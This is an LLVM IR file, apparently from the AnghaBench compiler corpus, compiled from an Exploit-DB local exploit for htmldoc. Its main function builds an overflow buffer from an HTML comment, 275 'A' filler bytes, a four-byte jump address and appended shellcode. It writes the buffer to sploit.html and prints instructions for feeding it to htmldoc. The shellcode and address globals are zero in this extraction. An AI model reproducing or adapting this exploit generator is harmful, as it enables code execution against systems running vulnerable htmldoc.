; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_9595.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_9595.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [22 x i8] c"\0A[*] Creating buffer\0A\00", align 1
@.str.1 = private unnamed_addr constant [20 x i8] c"<!-- MEDIA SIZE 1x1\00", align 1
@jmp = common dso_local global i32 0, align 4
@code = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [12 x i8] c"sploit.html\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.5 = private unnamed_addr constant [41 x i8] c"[*] Exploit file written to sploit.html\0A\00", align 1
@.str.6 = private unnamed_addr constant [46 x i8] c"Run as: htmldoc -f somefile.pdf sploit.html\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca [512 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %11 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0))
  %12 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %13 = call i32 @strcpy(i8* %12, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %9, align 4
  br label %14

14:                                               ; preds = %22, %3
  %15 = load i32, i32* %9, align 4
  %16 = icmp slt i32 %15, 275
  br i1 %16, label %17, label %25

17:                                               ; preds = %14
  %18 = load i32, i32* %9, align 4
  %19 = add nsw i32 19, %18
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 %20
  store i8 65, i8* %21, align 1
  br label %22

22:                                               ; preds = %17
  %23 = load i32, i32* %9, align 4
  %24 = add nsw i32 %23, 1
  store i32 %24, i32* %9, align 4
  br label %14

25:                                               ; preds = %14
  %26 = load i32, i32* @jmp, align 4
  %27 = and i32 %26, 255
  %28 = trunc i32 %27 to i8
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 294
  store i8 %28, i8* %29, align 2
  %30 = load i32, i32* @jmp, align 4
  %31 = and i32 %30, 65280
  %32 = ashr i32 %31, 8
  %33 = trunc i32 %32 to i8
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 295
  store i8 %33, i8* %34, align 1
  %35 = load i32, i32* @jmp, align 4
  %36 = and i32 %35, 16711680
  %37 = ashr i32 %36, 16
  %38 = trunc i32 %37 to i8
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 296
  store i8 %38, i8* %39, align 8
  %40 = load i32, i32* @jmp, align 4
  %41 = and i32 %40, -16777216
  %42 = lshr i32 %41, 24
  %43 = trunc i32 %42 to i8
  %44 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 297
  store i8 %43, i8* %44, align 1
  %45 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 298
  store i8 0, i8* %45, align 2
  %46 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %47 = load i32, i32* @code, align 4
  %48 = call i32 @strcat(i8* %46, i32 %47)
  %49 = call i32* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  store i32* %49, i32** %10, align 8
  %50 = load i32*, i32** %10, align 8
  %51 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %52 = call i32 @fprintf(i32* %50, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %51)
  %53 = load i32*, i32** %10, align 8
  %54 = call i32 @fclose(i32* %53)
  %55 = call i32 @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.5, i64 0, i64 0))
  %56 = call i32 @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.6, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i32) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, i8*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
